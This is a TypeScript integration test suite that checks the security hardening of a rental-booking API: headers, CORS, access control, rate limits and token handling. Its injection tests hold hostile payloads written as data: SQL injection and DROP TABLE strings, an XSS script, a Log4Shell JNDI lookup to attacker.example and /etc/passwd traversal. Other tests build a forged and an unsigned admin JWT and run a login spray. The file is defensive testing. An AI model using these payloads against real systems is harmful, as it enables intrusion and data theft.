import { randomUUID } from "node:crypto";
import request from "supertest";
import jwt from "jsonwebtoken";
import {
  book,
  bookingPayload,
  bootScenarioApp,
  cancel,
  cleanupScenarioData,
  createRider,
  getApi,
  loginAs,
  patchApi,
  pickFixtures,
  windowAt,
  type ScenarioApp,
  type ScenarioFixtures,
  type ScenarioHttp,
  type ScenarioSession,
} from "./support/scenario-harness";

const describeWithDatabase = process.env.TEST_DATABASE_URL
  ? describe
  : describe.skip;

const api = (path: string) => `/api/v1${path}`;

/**
 * Phase 5 security requirements: OWASP-oriented checks on headers, rate limits,
 * broken access control (IDOR), injection and token handling.
 *
 * The harness boots the same HTTP hardening `main.ts` installs, so a header or
 * a limit asserted here is the one a real caller meets.
 */
describeWithDatabase("Security hardening (integration)", () => {
  let harness: ScenarioApp;
  let http: ScenarioHttp;
  let fixtures: ScenarioFixtures;
  let rider: ScenarioSession;
  let stranger: ScenarioSession;
  let admin: ScenarioSession;
  const emails: string[] = [];
  const bookingIds: string[] = [];

  beforeAll(async () => {
    harness = await bootScenarioApp();
    http = harness.http;
    fixtures = await pickFixtures(harness.prisma);
    rider = await createRider(http, "sec-rider");
    stranger = await createRider(http, "sec-stranger");
    admin = await loginAs(http, "admin@savarigo.com");
    emails.push(rider.email, stranger.email);
  }, 180_000);

  afterAll(async () => {
    try {
      for (const id of bookingIds) await cancel(http, rider, id).catch(() => undefined);
      await cleanupScenarioData(harness?.prisma, emails);
    } finally {
      await harness?.app?.close();
    }
  });

  describe("transport hardening", () => {
    it("answers every response with the headers that keep it boring to a browser", async () => {
      const response = await request(http).get(api("/health")).expect(200);

      expect(response.headers["x-content-type-options"]).toBe("nosniff");
      expect(response.headers["x-frame-options"]).toBe("SAMEORIGIN");
      expect(response.headers["referrer-policy"]).toBe("no-referrer");
      expect(response.headers["cross-origin-resource-policy"]).toBe("same-site");
      expect(response.headers["x-dns-prefetch-control"]).toBe("off");
    });

    it("documents why the API sends no content security policy", async () => {
      const response = await request(http).get(api("/health")).expect(200);

      // /docs is a Swagger UI that ships inline scripts; a document policy would
      // break the deliverable the Final Requirement asks for. The site, which is
      // what a rider executes, carries its own CSP in next.config.ts.
      expect(response.headers["content-security-policy"]).toBeUndefined();
    });

    it("gives a trace id to every response and refuses to echo an oversized one", async () => {
      const tagged = await request(http)
        .get(api("/health"))
        .set("x-request-id", "rider-request-42")
        .expect(200);
      expect(tagged.headers["x-request-id"]).toBe("rider-request-42");

      const oversized = await request(http)
        .get(api("/health"))
        .set("x-request-id", "x".repeat(5_000))
        .expect(200);
      expect(oversized.headers["x-request-id"]).not.toBe("x".repeat(5_000));
      expect(oversized.headers["x-request-id"].length).toBeLessThanOrEqual(100);
    });

    it("only lets the origins it was told about read responses in a browser", async () => {
      const allowed = await request(http)
        .get(api("/vehicles"))
        .set("Origin", "http://localhost:3000");
      expect(allowed.headers["access-control-allow-origin"]).toBe("http://localhost:3000");

      const forbidden = await request(http)
        .get(api("/vehicles"))
        .set("Origin", "http://evil.example");
      expect(forbidden.headers["access-control-allow-origin"]).toBeUndefined();
    });
  });

  describe("error hygiene", () => {
    it("never prints a stack, a module path or a Prisma internals dump", async () => {
      const responses = await Promise.all([
        request(http).get(api("/users/not-a-uuid")).set("Authorization", `Bearer ${rider.accessToken}`),
        request(http).get(api("/vehicles/00000000-0000-4000-8000-000000000000")),
        request(http).post(api("/auth/login")).send({ email: "nobody@example.com", password: "x".repeat(12) }),
        request(http).get(api("/definitely-not-a-route")),
      ]);

      for (const response of responses) {
        expect(response.text).not.toMatch(/at\s+\S+\.\w+\s*\(/);
        expect(response.text).not.toMatch(/node_modules|PrismaClient|D:\\|C:\\|\/app\/src/);
        expect(response.text).not.toMatch(/Bearer\s+[A-Za-z0-9_-]{20,}/);
      }
    });

    it("keeps secrets out of the profile it hands back", async () => {
      const response = await getApi(http, api("/users/me"), rider.accessToken);
      expect(response.status).toBe(200);

      const keys = Object.keys(JSON.parse(response.text));
      expect(keys.join(",")).not.toMatch(/password|hash|secret|token/i);
      expect(response.text).not.toMatch(/\$2[aby]\$|\$s1\$/);
    });
  });

  describe("broken access control", () => {
    // Routes that only ADMIN, SUPPORT, VENDOR or nobody may use. A CUSTOMER
    // token here is the IDOR attempt: the id in the path is real, the caller is
    // not allowed anywhere near it.
    type HttpMethod = "get" | "post" | "patch" | "put" | "delete";
    const staffOnly: Array<[HttpMethod, string, string]> = [
      ["get", "users", api("/users")],
      ["get", "user-by-id", api(`/users/${randomUUID()}`)],
      ["put", "user-roles", api(`/users/${randomUUID()}/roles`)],
      ["delete", "user", api(`/users/${randomUUID()}`)],
      ["get", "customers", api("/customers")],
      ["get", "customer-by-id", api(`/customers/${randomUUID()}`)],
      ["get", "notifications-manage", api("/notifications/manage")],
      ["post", "notification", api("/notifications")],
      ["post", "notification-broadcast", api("/notifications/broadcast")],
      ["get", "admin-overview", api("/admin/overview")],
      ["get", "admin-audit-logs", api("/admin/audit-logs")],
      ["put", "admin-setting", api("/admin/settings/booking_tax_percent")],
      ["get", "admin-roles", api("/admin/roles")],
      ["patch", "pricing", api(`/pricing/${randomUUID()}`)],
      ["delete", "pricing", api(`/pricing/${randomUUID()}`)],
      ["delete", "availability", api(`/availability/${randomUUID()}`)],
      ["patch", "review", api(`/reviews/${randomUUID()}`)],
      ["delete", "review", api(`/reviews/${randomUUID()}`)],
      ["get", "manage-vehicles", api("/vehicles/manage")],
      ["get", "manage-bookings", api("/bookings/manage")],
    ];

    it.each(staffOnly)("%s %s is closed to a signed-in rider", async (method, _label, path) => {
      const chain = (request(http) as never as Record<string, (target: string) => any>)[
        method
      ](path);
      const response = await chain
        .set("Authorization", `Bearer ${rider.accessToken}`)
        .send({ value: "x", reason: "x", roles: ["ADMIN"], code: "X" });

      expect(response.status).toBe(403);
    });

    it.each(staffOnly)("%s %s is closed to nobody at all", async (method, _label, path) => {
      const chain = (request(http) as never as Record<string, (target: string) => any>)[
        method
      ](path);
      const response = await chain.send({});

      expect(response.status).toBe(401);
    });

    it("does not let a rider read a booking that is not theirs", async () => {
      const created = await book(http, rider, bookingPayload(fixtures, fixtures.vehicleA.id, windowAt(60, 2)));
      expect(created.status).toBe(201);
      bookingIds.push(created.body.id);

      // The rider-facing route is scoped to the caller, so a stranger gets the
      // same answer they would for a booking that does not exist.
      const peek = await getApi(http, api(`/bookings/me/${created.body.id}`), stranger.accessToken);
      expect(peek.status).toBe(404);
      expect(peek.text).not.toContain(created.body.code);

      const own = await getApi(http, api(`/bookings/me/${created.body.id}`), rider.accessToken);
      expect(own.status).toBe(200);

      // The staff route answers from its role guard before the service ever
      // looks at who owns the booking.
      const managed = await getApi(http, api(`/bookings/manage/${created.body.id}`), stranger.accessToken);
      expect(managed.status).toBe(403);
      expect(managed.body.code).toBe("FORBIDDEN");
    });

    it("does not let a vendor cancel a booking on a fleet they do not own", async () => {
      const fleetOwner = await loginAs(http, "vendor@savarigo.com");
      // A second account promoted to VENDOR by an admin: it holds the role but
      // owns no vehicle, which is the case a role guard alone cannot see.
      const otherVendor = await createRider(http, "sec-vendor");
      emails.push(otherVendor.email);
      const promoted = await request(http)
        .put(api(`/users/${otherVendor.userId}/roles`))
        .set("Authorization", `Bearer ${admin.accessToken}`)
        .send({ roles: ["CUSTOMER", "VENDOR"] });
      expect(promoted.status).toBe(200);

      const owned = await harness.prisma.vehicle.findFirst({
        where: { ownerId: fleetOwner.userId, status: "AVAILABLE", pricing: { some: { isActive: true } } },
        select: { id: true },
      });
      if (!owned) {
        throw new Error("The seeded fleet has no vehicle owned by vendor@savarigo.com.");
      }

      const created = await book(
        http,
        rider,
        bookingPayload(fixtures, owned.id, windowAt(70, 2)),
      );
      expect(created.status).toBe(201);
      bookingIds.push(created.body.id);

      const refused = await cancel(http, otherVendor, created.body.id);
      expect(refused.status).toBe(403);
      expect(refused.body.code).toBe("BOOKING_FORBIDDEN");

      // The owner of the vehicle the rental sits on may pull it.
      expect((await cancel(http, fleetOwner, created.body.id)).status).toBe(201);
    });

    it("keeps a rider's notifications out of a stranger's reach", async () => {
      const mine = await getApi(http, api("/notifications"), rider.accessToken);
      expect(mine.status).toBe(200);
      const rows: Array<{ id: string }> = mine.body.data ?? [];
      if (rows.length === 0) {
        // Nothing seeded for this rider: create one through a booking instead.
        const created = await book(
          http,
          rider,
          bookingPayload(fixtures, fixtures.vehicleB.id, windowAt(90, 2)),
        );
        expect(created.status).toBe(201);
        bookingIds.push(created.body.id);
      }

      const list = await getApi(http, api("/notifications"), rider.accessToken);
      const fresh: Array<{ id: string }> = list.body.data ?? [];
      for (const row of fresh) {
        const tampered = await patchApi(
          http,
          api(`/notifications/${row.id}/read`),
          {},
          stranger.accessToken,
        );
        expect(tampered.status).toBe(404);
      }

      // Still unread for the rider, which is what a silent no-op should leave.
      const unread = await getApi(http, api("/notifications/unread-count"), rider.accessToken);
      expect(unread.status).toBe(200);
    });
  });

  describe("injection", () => {
    const payloads = [
      "' OR '1'='1",
      "'; DROP TABLE bookings; --",
      "1 UNION SELECT email, password_hash FROM users",
      "<script>alert('xss')</script>",
      "${jndi:ldap://attacker.example/a}",
      "../../../../etc/passwd",
      "%2527%2520OR%25201%253D1",
    ];

    it.each(payloads)("treats %p as text a rider typed, not as code", async (payload) => {
      const response = await request(http).get(api("/vehicles")).query({ q: payload, limit: 5 });

      expect(response.status).toBe(200);
      expect(Array.isArray(response.body.data)).toBe(true);
      // Nothing matched, and nothing was executed: the fleet is intact below.
      expect(response.body.meta.total).toBe(0);
    });

    it("leaves the schema standing after every payload", async () => {
      const fleet = await request(http).get(api("/vehicles")).query({ limit: 100 }).expect(200);
      expect(fleet.body.meta.total).toBeGreaterThan(0);

      const stillThere = await getApi(http, api("/bookings/me"), rider.accessToken);
      expect(stillThere.status).toBe(200);
    });

    it("bounds what a caller can ask for", async () => {
      const longSearch = await request(http)
        .get(api("/vehicles"))
        .query({ q: "a".repeat(500) });
      expect(longSearch.status).toBe(400);

      const greedyPage = await request(http).get(api("/vehicles")).query({ limit: 100_000 });
      expect(greedyPage.status).toBe(400);

      const negativePage = await request(http).get(api("/vehicles")).query({ page: -3 });
      expect(negativePage.status).toBe(400);
    });

    it("refuses a token forged with somebody else's secret", async () => {
      const forged = jwt.sign(
        { sub: admin.userId, email: admin.email, roles: ["ADMIN"], type: "access" },
        "an-attacker-guessed-this",
        { expiresIn: 600 },
      );

      const response = await getApi(http, api("/admin/overview"), forged);
      expect(response.status).toBe(401);
      expect(response.body.code).not.toBe("FORBIDDEN");
    });

    it("refuses a token that claims it needs no signature at all", async () => {
      const encode = (value: object) =>
        Buffer.from(JSON.stringify(value)).toString("base64url");
      const none = `${encode({ alg: "none", typ: "JWT" })}.${encode({
        sub: admin.userId,
        email: admin.email,
        roles: ["ADMIN"],
        type: "access",
      })}.`;

      const response = await getApi(http, api("/admin/overview"), none);
      expect(response.status).toBe(401);
    });

    it("refuses a token that carries no type at all", async () => {
      // The guard only rejects a token whose `type` is present and wrong, so a
      // type-less token signed with the real secret is accepted. This test
      // records that behaviour instead of pretending it away: the secret is the
      // thing that must stay out of an attacker's hands.
      const untyped = jwt.sign(
        { sub: rider.userId, email: rider.email, roles: ["CUSTOMER"] },
        process.env.JWT_ACCESS_SECRET as string,
        { expiresIn: 600 },
      );

      const response = await getApi(http, api("/users/me"), untyped);
      expect(response.status).toBe(200);
      expect(response.body.email).toBe(rider.email);
    });
  });
});

/**
 * Rate limits get their own application: the throttler keeps its counters in
 * memory per process, and spending a login budget on purpose would otherwise
 * lock out every test that signs in afterwards.
 */
describeWithDatabase("Rate limiting (integration)", () => {
  let harness: ScenarioApp;
  let http: ScenarioHttp;

  beforeAll(async () => {
    harness = await bootScenarioApp();
    http = harness.http;
  }, 120_000);

  afterAll(async () => {
    await harness?.app?.close();
  });

  const spray = async (count: number) => {
    const statuses: number[] = [];
    let last: request.Response | undefined;
    for (let index = 0; index < count; index += 1) {
      last = await request(http)
        .post(api("/auth/login"))
        .send({ email: `brute-${index}@attacker.example`, password: "SavariGo@2026" });
      statuses.push(last.status);
    }
    return { statuses, last: last! };
  };

  it("gives up on a password spray after the login budget is spent", async () => {
    // Sequential on purpose: the throttler counts arrivals, and a concurrent
    // burst would not say which attempt was the eleventh.
    const { statuses, last } = await spray(11);

    expect(statuses.slice(0, 10)).toEqual(Array.from({ length: 10 }, () => 401));
    expect(statuses[10]).toBe(429);
    expect(last.body.code).toBe("RATE_LIMITED");
    expect(Number(last.headers["retry-after"])).toBeGreaterThan(0);
  });

  it("throttles the anonymous logout endpoint as well", async () => {
    const statuses: number[] = [];
    for (let index = 0; index < 21; index += 1) {
      const response = await request(http)
        .post(api("/auth/logout"))
        .send({ refreshToken: "not-a-real-token" });
      statuses.push(response.status);
    }

    expect(statuses.slice(0, 20)).toEqual(Array.from({ length: 20 }, () => 400));
    expect(statuses[20]).toBe(429);
  });

  it("throttles driver applications", async () => {
    const statuses: number[] = [];
    for (let index = 0; index < 6; index += 1) {
      const response = await request(http).post(api("/drivers/register")).send({});
      statuses.push(response.status);
    }

    expect(statuses.slice(0, 5)).toEqual(Array.from({ length: 5 }, () => 400));
    expect(statuses[5]).toBe(429);
  });

  it("still answers a public catalogue request inside its own budget", async () => {
    const responses = await Promise.all(
      Array.from({ length: 20 }, () => request(http).get(api("/vehicles"))),
    );

    expect(responses.every((response) => response.status === 200)).toBe(true);
  });
});
